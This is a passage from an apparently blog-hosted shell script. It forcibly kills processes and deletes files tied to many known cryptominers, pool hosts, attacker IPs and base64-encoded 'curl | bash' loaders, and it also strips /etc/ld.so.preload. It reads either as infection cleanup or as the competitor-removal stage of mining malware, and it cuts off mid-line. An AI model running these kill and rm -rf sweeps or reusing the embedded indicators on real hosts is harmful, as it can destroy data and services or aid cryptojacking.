class="comment">#ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi | awk &#x27;$3&gt;80.0&#123;print $2&#125;&#x27; | xargs -I % kill -9 %</span></span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot; ps&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;sync_supers&quot;</span> | cut -c 9-15 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;cpuset&quot;</span> | cut -c 9-15 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;x]&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;sh] &lt;&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot; \[]&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/l.sh&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/zmcat&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;CnzFVPLF&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;CvKzzZLs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aziplcr72qjhzvin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/udevd&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;sustse&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;sustse3&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;mr.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;mr.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;2mr.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;2mr.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;cr5.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;cr5.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;logo9.jpg&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;logo9.jpg&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;j2.conf&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;luk-cpu&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;luk-cpu&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ficov&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ficov&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;he.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;he.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;miner.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;miner.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nullcrew&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nullcrew&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;107.174.47.156&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;83.220.169.247&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.203.146&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;144.217.45.45&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;107.174.47.181&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;176.31.6.16&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;mine.moneropool.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;pool.t00ls.ru&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:8080&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:3333&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;zhuabcn@yahoo.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;monerohash.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;/tmp/a7b104c270&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:6666&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:7777&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:443&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;stratum.f2pool.com:8888&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmrpool.eu&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;kieuanilam.me&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep xiaoyao | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep xiaoxue | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">&#x27;46.243.253.15&#x27;</span> | grep <span class="string">&#x27;ESTABLISHED\|SYN_SENT&#x27;</span> | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | sed -e <span class="string">&quot;s/\/.*//g&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">&#x27;176.31.6.16&#x27;</span> | grep <span class="string">&#x27;ESTABLISHED\|SYN_SENT&#x27;</span> | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | sed -e <span class="string">&quot;s/\/.*//g&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f L2Jpbi9iYXN | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f xzpauectgr | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f slxfbkmxtd | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mixtape | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f addnj | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 200.68.17.196 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mwyumwdbpq.conf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f honvbsasbf.conf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mqdsflm.cf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f lower.sh | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./ppp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f cryptonight | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./seervceaess | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servceaess | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servceas | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servcesa | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./vsp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./jvs | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./pvv | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./vpp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./pces | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./rspce | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./haveged | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./jiba | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./watchbog | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./A7mA5gb | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kacpi_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kswap_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kauditd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kpsmoused_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kseriod_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kthreadd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ksoftirqd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kintegrityd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f jawa | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f oracle.jpg | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 188.209.49.54 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 181.214.87.241 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f servim | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kblockd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f native_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ynn | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 65ccEJ7 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f jmxx | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 2Ne80nA | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f sysstats | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f systemxlv | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f watchbog | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f OIcJi1m | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pkill -f biosetjenkins</span><br><span class="line">pkill -f Loopback</span><br><span class="line">pkill -f apaceha</span><br><span class="line">pkill -f cryptonight</span><br><span class="line">pkill -f mixnerdx</span><br><span class="line">pkill -f performedl</span><br><span class="line">pkill -f JnKihGjn</span><br><span class="line">pkill -f irqba2anc1</span><br><span class="line">pkill -f irqba5xnc1</span><br><span class="line">pkill -f irqbnc1</span><br><span class="line">pkill -f ir29xc1</span><br><span class="line">pkill -f conns</span><br><span class="line">pkill -f irqbalance</span><br><span class="line">pkill -f crypto-pool</span><br><span class="line">pkill -f XJnRj</span><br><span class="line">pkill -f mgwsl</span><br><span class="line">pkill -f pythno</span><br><span class="line">pkill -f jweri</span><br><span class="line">pkill -f lx26</span><br><span class="line">pkill -f NXLAi</span><br><span class="line">pkill -f BI5zj</span><br><span class="line">pkill -f askdljlqw</span><br><span class="line">pkill -f minerd</span><br><span class="line">pkill -f minergate</span><br><span class="line">pkill -f Guard.sh</span><br><span class="line">pkill -f ysaydh</span><br><span class="line">pkill -f bonns</span><br><span class="line">pkill -f donns</span><br><span class="line">pkill -f kxjd</span><br><span class="line">pkill -f Duck.sh</span><br><span class="line">pkill -f bonn.sh</span><br><span class="line">pkill -f conn.sh</span><br><span class="line">pkill -f kworker34</span><br><span class="line">pkill -f kw.sh</span><br><span class="line">pkill -f pro.sh</span><br><span class="line">pkill -f polkitd</span><br><span class="line">pkill -f acpid</span><br><span class="line">pkill -f icb5o</span><br><span class="line">pkill -f nopxi</span><br><span class="line">pkill -f irqbalanc1</span><br><span class="line">pkill -f minerd</span><br><span class="line">pkill -f i586</span><br><span class="line">pkill -f gddr</span><br><span class="line">pkill -f mstxmr</span><br><span class="line">pkill -f ddg.2011</span><br><span class="line">pkill -f wnTKYg</span><br><span class="line">pkill -f deamon</span><br><span class="line">pkill -f disk_genius</span><br><span class="line">pkill -f sourplum</span><br><span class="line">pkill -f polkitd</span><br><span class="line">pkill -f nanoWatch</span><br><span class="line">pkill -f zigw</span><br><span class="line">pkill -f devtool</span><br><span class="line">pkill -f devtools</span><br><span class="line">pkill -f systemctI</span><br><span class="line">pkill -f watchbog</span><br><span class="line">pkill -f cryptonight</span><br><span class="line">pkill -f sustes</span><br><span class="line">pkill -f xmrig</span><br><span class="line">pkill -f xmrig-cpu</span><br><span class="line">pkill -f 121.42.151.137</span><br><span class="line">pkill -f init12.cfg</span><br><span class="line">pkill -f nginxk</span><br><span class="line">pkill -f tmp/wc.conf</span><br><span class="line">pkill -f xmrig-notls</span><br><span class="line">pkill -f xmr-stak</span><br><span class="line">pkill -f suppoie</span><br><span class="line">pkill -f zer0day.ru</span><br><span class="line">pkill -f dbus-daemon--system</span><br><span class="line">pkill -f nullcrew</span><br><span class="line">pkill -f systemctI</span><br><span class="line">pkill -f kworkerds</span><br><span class="line">pkill -f init10.cfg</span><br><span class="line">pkill -f /wl.conf</span><br><span class="line">pkill -f crond64</span><br><span class="line">pkill -f sustse</span><br><span class="line">pkill -f vmlinuz</span><br><span class="line">pkill -f exin</span><br><span class="line">pkill -f apachiii</span><br><span class="line">pkill -f svcworkmanager</span><br><span class="line">pkill -f xr</span><br><span class="line">pkill -f trace</span><br><span class="line">pkill -f svcupdate</span><br><span class="line">pkill -f networkmanager</span><br><span class="line">pkill -f phpupdate</span><br><span class="line">rm -rf /usr/bin/config.json</span><br><span class="line">rm -rf /usr/bin/exin</span><br><span class="line">rm -rf /tmp/wc.conf</span><br><span class="line">rm -rf /tmp/log_rot</span><br><span class="line">rm -rf /tmp/apachiii</span><br><span class="line">rm -rf /tmp/sustse</span><br><span class="line">rm -rf /tmp/php</span><br><span class="line">rm -rf /tmp/p2.conf</span><br><span class="line">rm -rf /tmp/pprt</span><br><span class="line">rm -rf /tmp/ppol</span><br><span class="line">rm -rf /tmp/javax/config.sh</span><br><span class="line">rm -rf /tmp/javax/sshd2</span><br><span class="line">rm -rf /tmp/.profile</span><br><span class="line">rm -rf /tmp/1.so</span><br><span class="line">rm -rf /tmp/kworkerds</span><br><span class="line">rm -rf /tmp/kworkerds3</span><br><span class="line">rm -rf /tmp/kworkerdssx</span><br><span class="line">rm -rf /tmp/xd.json</span><br><span class="line">rm -rf /tmp/syslogd</span><br><span class="line">rm -rf /tmp/syslogdb</span><br><span class="line">rm -rf /tmp/65ccEJ7</span><br><span class="line">rm -rf /tmp/jmxx</span><br><span class="line">rm -rf /tmp/2Ne80nA</span><br><span class="line">rm -rf /tmp/dl</span><br><span class="line">rm -rf /tmp/ddg</span><br><span class="line">rm -rf /tmp/systemxlv</span><br><span class="line">rm -rf /tmp/systemctI</span><br><span class="line">rm -rf /tmp/.abc</span><br><span class="line">rm -rf /tmp/osw.hb</span><br><span class="line">rm -rf /tmp/.tmpleve</span><br><span class="line">rm -rf /tmp/.tmpnewzz</span><br><span class="line">rm -rf /tmp/.java</span><br><span class="line">rm -rf /tmp/.omed</span><br><span class="line">rm -rf /tmp/.tmpc</span><br><span class="line">rm -rf /tmp/.tmpleve</span><br><span class="line">rm -rf /tmp/.tmpnewzz</span><br><span class="line">rm -rf /tmp/gates.lod</span><br><span class="line">rm -rf /tmp/conf.n</span><br><span class="line">rm -rf /tmp/devtool</span><br><span class="line">rm -rf /tmp/devtools</span><br><span class="line">rm -rf /tmp/fs</span><br><span class="line">rm -rf /tmp/.rod</span><br><span class="line">rm -rf /tmp/.rod.tgz</span><br><span class="line">rm -rf /tmp/.rod.tgz.1</span><br><span class="line">rm -rf /tmp/.rod.tgz.2</span><br><span class="line">rm -rf /tmp/.mer</span><br><span class="line">rm -rf /tmp/.mer.tgz</span><br><span class="line">rm -rf /tmp/.mer.tgz.1</span><br><span class="line">rm -rf /tmp/.hod</span><br><span class="line">rm -rf /tmp/.hod.tgz</span><br><span class="line">rm -rf /tmp/.hod.tgz.1</span><br><span class="line">rm -rf /tmp/84Onmce</span><br><span class="line">rm -rf /tmp/C4iLM4L</span><br><span class="line">rm -rf /tmp/lilpip</span><br><span class="line">rm -rf /tmp/3lmigMo</span><br><span class="line">rm -rf /tmp/am8jmBP</span><br><span class="line">rm -rf /tmp/tmp.txt</span><br><span class="line">rm -rf /tmp/baby</span><br><span class="line">rm -rf /tmp/.lib</span><br><span class="line">rm -rf /tmp/systemd</span><br><span class="line">rm -rf /tmp/lib.tar.gz</span><br><span class="line">rm -rf /tmp/baby</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/j2.conf</span><br><span class="line">rm -rf /tmp/.mynews1234</span><br><span class="line">rm -rf /tmp/a3e12d</span><br><span class="line">rm -rf /tmp/.pt</span><br><span class="line">rm -rf /tmp/.pt.tgz</span><br><span class="line">rm -rf /tmp/.pt.tgz.1</span><br><span class="line">rm -rf /tmp/go</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/j2.conf</span><br><span class="line">rm -rf /tmp/.tmpnewasss</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/go.sh</span><br><span class="line">rm -rf /tmp/go2.sh</span><br><span class="line">rm -rf /tmp/khugepageds</span><br><span class="line">rm -rf /tmp/.censusqqqqqqqqq</span><br><span class="line">rm -rf /tmp/.kerberods</span><br><span class="line">rm -rf /tmp/kerberods</span><br><span class="line">rm -rf /tmp/seasame</span><br><span class="line">rm -rf /tmp/touch</span><br><span class="line">rm -rf /tmp/.p</span><br><span class="line">rm -rf /tmp/runtime2.sh</span><br><span class="line">rm -rf /tmp/runtime.sh</span><br><span class="line">rm -rf /dev/shm/z3.sh</span><br><span class="line">rm -rf /dev/shm/z2.sh</span><br><span class="line">rm -rf /dev/shm/.scr</span><br><span class="line">rm -rf /dev/shm/.kerberods</span><br><span class="line">rm -f /etc/ld.so.preload</span><br><span class="line">rm -f /usr/<span class="built_in">local</span>/lib/libioset.so</span><br><span class="line">chattr -i /etc/ld.so.preload</span><br><span class="line">rm -f /etc/ld.so.preload</span><br><span class="line">rm -f /usr/<span class="built_in">local</span>/lib/libioset.so</span><br><span class="line">rm -rf /tmp/watchdogs</span><br><span class="line">rm -rf /etc/cron.d/tomcat</span><br><span class="line">rm -rf /etc/rc.d/init.d/watchdogs</span><br><span class="line">rm -rf /usr/sbin/watchdogs</span><br><span class="line">rm -f /tmp/kthrotlds</span><br><span class="line">rm -f /etc/rc.d/init.d/kthrotlds</span><br><span class="line">rm -rf /tmp/.sysbabyuuuuu12</span><br><span class="line">rm -rf /tmp/logo9.jpg</span><br><span class="line">rm -rf /tmp/miner.sh</span><br><span class="line">rm -rf /tmp/nullcrew</span><br><span class="line">rm -rf /tmp/proc</span><br><span class="line">rm -rf /tmp/2.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.1</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.2</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.3</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.1</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.2</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.3</span><br><span class="line">rm -rf /var/tmp/f41</span><br><span class="line">rm -rf /var/tmp/2.sh</span><br><span class="line">rm -rf /var/tmp/config.json</span><br><span class="line">rm -rf /var/tmp/xmrig</span><br><span class="line">rm -rf /var/tmp/1.so</span><br><span class="line">rm -rf /var/tmp/kworkerds3</span><br><span class="line">rm -rf /var/tmp/kworkerdssx</span><br><span class="line">rm -rf /var/tmp/kworkerds</span><br><span class="line">rm -rf /var/tmp/wc.conf</span><br><span class="line">rm -rf /var/tmp/nadezhda.</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm.1</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm.2</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64.1</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64.2</span><br><span class="line">rm 